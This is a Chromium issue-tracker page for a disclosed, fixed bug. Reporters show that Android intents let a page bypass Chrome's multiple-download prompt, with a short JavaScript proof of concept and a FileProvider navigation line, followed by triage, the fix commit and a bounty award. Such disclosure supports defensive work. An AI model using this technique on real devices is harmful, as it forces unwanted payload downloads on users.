# Multiple-file download restrictions can be bypassed using Android intents

| Field | Value |
|-------|-------|
| **Issue ID** | [40052525](https://issues.chromium.org/issues/40052525) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P3 |
| **Component** | Mobile>Intents, UI>Browser>Downloads |
| **Platforms** | Android |
| **Reporter** | wy...@gmail.com |
| **Assignee** | qi...@chromium.org |
| **Created** | 2020-06-08 |
| **Bounty** | $500.00 |

## Description

Originally reported in https://crbug.com/chromium/1092025:

Because a new mitigation measure called 'scoped storage' has been introduced since android 10, we can not use 'com.android.chrome.FileProvider' to jump to 'content://' just like android 9.

```
top.location = "android-app://com.android.chrome/content/com.android.chrome.FileProvider/downloads/exp_payload.html";
```

The 'com.android.chrome.FileProvider' is defined in AndroidManifest.xml of chrome:

```
<provider n1:authorities="com.android.chrome.FileProvider" n1:exported="false" n1:grantUriPermissions="true" n1:name="org.chromium.chrome.browser.util.ChromeFileProvider">
    <meta-data n1:name="android.support.FILE_PROVIDER_PATHS" n1:resource="@xml/file_paths"/>
</provider>
```

So we try to download multiple files, and jump to one of our downloaded files by 'content://media/external/downloads/id'. And more files we download, more likely we succeed.

But, if you want to download multiple files with javascript, chrome will prompt to user with "http://xxx wants to download multiple files". Only user clicks 'Allow', the downloading would go on. But we found a new skill to bypass it as follows, we named it "file-spray", just like the binary exploit skill 'heap-spray'.

the following javascript code runs in http://xx.xx.xx.xx:xx/test.html.

```
<script type="text/javascript">
    //jump to chrome self to download multiple payloads
    function jump_to_chrome_self(num) {
        //open 'http://xx.xx.xx.xx:xx/test.html?num=xxx' again
        top.location = "android-app://com.android.chrome/http/xx.xx.xx.xx:xx/test.html?num=" + num;	//please input your test ip and port
    }

    var num = get_num_from_location();
    if(num < N) {	//goto chrome self to download payload once more
        download_payload();
        num++;
        //setTimeout("jump_to_chrome_self(" + num + ");", 1000);
        jump_to_chrome_self(num);
    }
</script>
```

...

Chrome takes measures to avoid downloading multiple files automatically in the same tab scope.

But the jumping by "android-app://" to downloading multiple files automatically should also to be considered.

## Timeline

### mb...@chromium.org (2020-06-08)

[Empty comment from Monorail migration]

### mt...@chromium.org (2020-06-08)

Passing off to dtrainor to decide how to fix, as I'm not familiar with multiple-downloads mitigation.

Some possible ways to fix this:
1. Remove the user gesture after triggering a download such that navigations after downloading can't launch an app/open a new tab.
2. Track download state through the intent navigation. (Put a token on the intent that Chrome processes?)
3. Detect when an intent from Chrome targets Chrome (startActivityIfNeeded?) and instead of launching a new tab, clobber the current one? (Riskier, in that it may break valid current use cases, but might fix this class of bug?)

### dt...@chromium.org (2020-06-08)

[Empty comment from Monorail migration]

### dt...@chromium.org (2020-06-09)

qinmin@ - Can you take a look from the download side?  Let me know if you think the suggested fix involves intent management and I can help out / find someone to help on that too!

FWIW, should we just be tracking multiple downloads across tab scopes?

### [Deleted User] (2020-06-09)

Setting Pri-2 to match security severity Low. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ad...@google.com (2020-06-09)

[Empty comment from Monorail migration]

### ad...@google.com (2020-06-09)

[Empty comment from Monorail migration]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-06-17)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/5af39e89bd120022c894299b56499599b02a5c74

commit 5af39e89bd120022c894299b56499599b02a5c74
Author: Min Qin <qinmin@chromium.org>
Date: Wed Jun 17 03:57:43 2020

Passing initiatorOrigin and isRendererInitiated in extra when launching an intent

Chrome could launch an intent that targets itself. However, the
initiatorOrigin and isRendererInitiated is not passed in the intent.
As a result, when handling the incoming intent, Chrome will treat
the intent as a fresh new navigation, which could cause some security
issues.

BUG=1092451, 1092025

Change-Id: I17a743861f081f4095c7d2688de164d07b104325
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2240040
Commit-Queue: Min Qin <qinmin@chromium.org>
Reviewed-by: Bo <boliu@chromium.org>
Reviewed-by: Robert Sesek <rsesek@chromium.org>
Reviewed-by: Ted Choc <tedchoc@chromium.org>
Reviewed-by: Michael Thiessen <mthiesse@chromium.org>
Reviewed-by: Charlie Harrison <csharrison@chromium.org>
Cr-Commit-Position: refs/heads/master@{#779166}

[modify] https://crrev.com/5af39e89bd120022c894299b56499599b02a5c74/chrome/android/chrome_java_sources.gni
[modify] https://crrev.com/5af39e89bd120022c894299b56499599b02a5c74/chrome/android/chrome_test_java_sources.gni
[modify] https://crrev.com/5af39e89bd120022c894299b56499599b02a5c74/chrome/android/java/src/org/chromium/chrome/browser/ChromeActivity.java
[modify] https://crrev.com/5af39e89bd120022c894299b56499599b02a5c74/chrome/android/java/src/org/chromium/chrome/browser/ChromeTabbedActivity.java
[modify] https://crrev.com/5af39e89bd120022c894299b56499599b02a5c74/chrome/android/java/src/org/chromium/chrome/browser/IntentHandler.java
[modify] https://crrev.com/5af39e89bd120022c894299b56499599b02a5c74/chrome/android/java/src/org/chromium/chrome/browser/LaunchIntentDispatcher.java
[modify] https://crrev.com/5af39e89bd120022c894299b56499599b02a5c74/chrome/android/java/src/org/chromium/chrome/browser/compositor/CompositorView.java
[modify] https://crrev.com/5af39e89bd120022c894299b56499599b02a5c74/chrome/android/java/src/org/chromium/chrome/browser/externalnav/ExternalNavigationDelegateImpl.java
[delete] https://crrev.com/911f84fce4b68586c67d47869083383e387aed3d/chrome/android/java/src/org/chromium/chrome/browser/externalnav/IntentWithGesturesHandler.java
[add] https://crrev.com/5af39e89bd120022c894299b56499599b02a5c74/chrome/android/java/src/org/chromium/chrome/browser/externalnav/IntentWithRequestMetadataHandler.java
[modify] https://crrev.com/5af39e89bd120022c894299b56499599b02a5c74/chrome/android/java/src/org/chromium/chrome/browser/tab/TabImpl.java
[modify] https://crrev.com/5af39e89bd120022c894299b56499599b02a5c74/chrome/android/java/src/org/chromium/chrome/browser/tab/WebContentsStateBridge.java
[modify] https://crrev.com/5af39e89bd120022c894299b56499599b02a5c74/chrome/android/java/src/org/chromium/chrome/browser/tabmodel/TabModelImpl.java
[modify] https://crrev.com/5af39e89bd120022c894299b56499599b02a5c74/chrome/android/java/src/org/chromium/chrome/browser/tabmodel/TabModelJniBridge.java
[modify] https://crrev.com/5af39e89bd120022c894299b56499599b02a5c74/chrome/android/javatests/src/org/chromium/chrome/browser/NavigateTest.java
[modify] https://crrev.com/5af39e89bd120022c894299b56499599b02a5c74/chrome/android/javatests/src/org/chromium/chrome/browser/contextualsearch/ContextualSearchManagerTest.java
[modify] https://crrev.com/5af39e89bd120022c894299b56499599b02a5c74/chrome/android/javatests/src/org/chromium/chrome/browser/externalnav/ExternalNavigationDelegateImplTest.java
[delete] https://crrev.com/911f84fce4b68586c67d47869083383e387aed3d/chrome/android/javatests/src/org/chromium/chrome/browser/externalnav/IntentWithGesturesHandlerTest.java
[add] https://crrev.com/5af39e89bd120022c894299b56499599b02a5c74/chrome/android/javatests/src/org/chromium/chrome/browser/externalnav/IntentWithRequestMetadataHandlerTest.java
[modify] https://crrev.com/5af39e89bd120022c894299b56499599b02a5c74/chrome/browser/android/tab_android.cc
[modify] https://crrev.com/5af39e89bd120022c894299b56499599b02a5c74/chrome/browser/android/tab_android.h
[modify] https://crrev.com/5af39e89bd120022c894299b56499599b02a5c74/chrome/browser/android/web_contents_state.cc
[modify] https://crrev.com/5af39e89bd120022c894299b56499599b02a5c74/chrome/browser/android/web_contents_state.h
[modify] https://crrev.com/5af39e89bd120022c894299b56499599b02a5c74/chrome/browser/ui/android/external_protocol_dialog_android.cc
[modify] https://crrev.com/5af39e89bd120022c894299b56499599b02a5c74/chrome/browser/ui/android/tab_model/tab_model_jni_bridge.cc
[add] https://crrev.com/5af39e89bd120022c894299b56499599b02a5c74/chrome/test/data/android/renderer_initiated/final.html
[add] https://crrev.com/5af39e89bd120022c894299b56499599b02a5c74/chrome/test/data/android/renderer_initiated/first.html
[add] https://crrev.com/5af39e89bd120022c894299b56499599b02a5c74/chrome/test/data/android/renderer_initiated/renderer_initiated.html
[modify] https://crrev.com/5af39e89bd120022c894299b56499599b02a5c74/components/external_intents/android/BUILD.gn
[modify] https://crrev.com/5af39e89bd120022c894299b56499599b02a5c74/components/external_intents/android/java/src/org/chromium/components/external_intents/ExternalNavigationDelegate.java
[modify] https://crrev.com/5af39e89bd120022c894299b56499599b02a5c74/components/external_intents/android/java/src/org/chromium/components/external_intents/ExternalNavigationHandler.java
[modify] https://crrev.com/5af39e89bd120022c894299b56499599b02a5c74/components/external_intents/android/java/src/org/chromium/components/external_intents/ExternalNavigationParams.java
[modify] https://crrev.com/5af39e89bd120022c894299b56499599b02a5c74/components/external_intents/android/java/src/org/chromium/components/external_intents/InterceptNavigationDelegateImpl.java
[modify] https://crrev.com/5af39e89bd120022c894299b56499599b02a5c74/components/external_intents/android/javatests/src/org/chromium/components/external_intents/ExternalNavigationHandlerTest.java
[modify] https://crrev.com/5af39e89bd120022c894299b56499599b02a5c74/components/navigation_interception/BUILD.gn
[modify] https://crrev.com/5af39e89bd120022c894299b56499599b02a5c74/components/navigation_interception/android/BUILD.gn
[modify] https://crrev.com/5af39e89bd120022c894299b56499599b02a5c74/components/navigation_interception/android/java/src/org/chromium/components/navigation_interception/NavigationParams.java
[modify] https://crrev.com/5af39e89bd120022c894299b56499599b02a5c74/components/navigation_interception/intercept_navigation_throttle.cc
[modify] https://crrev.com/5af39e89bd120022c894299b56499599b02a5c74/components/navigation_interception/navigation_params.cc
[modify] https://crrev.com/5af39e89bd120022c894299b56499599b02a5c74/components/navigation_interception/navigation_params.h
[modify] https://crrev.com/5af39e89bd120022c894299b56499599b02a5c74/components/navigation_interception/navigation_params_android.cc
[modify] https://crrev.com/5af39e89bd120022c894299b56499599b02a5c74/content/public/android/java/src/org/chromium/content_public/browser/LoadUrlParams.java
[modify] https://crrev.com/5af39e89bd120022c894299b56499599b02a5c74/weblayer/browser/java/org/chromium/weblayer_private/ExternalNavigationDelegateImpl.java


### qi...@chromium.org (2020-06-17)

[Empty comment from Monorail migration]

### [Deleted User] (2020-06-20)

[Empty comment from Monorail migration]

### na...@google.com (2020-06-22)

[Empty comment from Monorail migration]

### wy...@gmail.com (2020-07-15)

CREDIT INFORMATION

Reporter credit: [Yongke Wang(@Rudykewang) and Aryb1n(@aryb1n) of Tencent Security Xuanwu Lab (腾讯安全玄武实验室）]

### ad...@google.com (2020-08-05)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### ad...@google.com (2020-08-05)

Congratulations, the VRP panel decided to award $500 for this report.

### ad...@google.com (2020-08-06)

[Empty comment from Monorail migration]

### ad...@google.com (2020-08-24)

[Empty comment from Monorail migration]

### ad...@google.com (2020-08-24)

[Empty comment from Monorail migration]

### ad...@google.com (2020-09-21)

[Empty comment from Monorail migration]

### [Deleted User] (2020-09-23)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2020-09-23)

This issue was migrated from crbug.com/chromium/1092451?no_tracker_redirect=1

[Multiple monorail components: Mobile>Intents, UI>Browser>Downloads]
[Monorail blocking: crbug.com/chromium/1092025]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40052525)*
